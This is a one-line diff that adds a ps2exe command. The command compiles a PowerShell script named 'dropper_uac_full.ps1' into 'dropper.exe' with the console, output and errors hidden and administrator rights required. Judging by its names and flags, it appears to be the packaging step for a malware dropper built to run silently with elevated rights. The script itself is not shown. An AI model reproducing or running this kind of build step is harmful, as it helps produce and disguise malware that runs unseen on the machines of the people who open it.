@@ -1,0 +1,1 @@
+ps2exe .\dropper_uac_full.ps1 .\dropper.exe -noConsole -noOutput -noError -requireAdmin
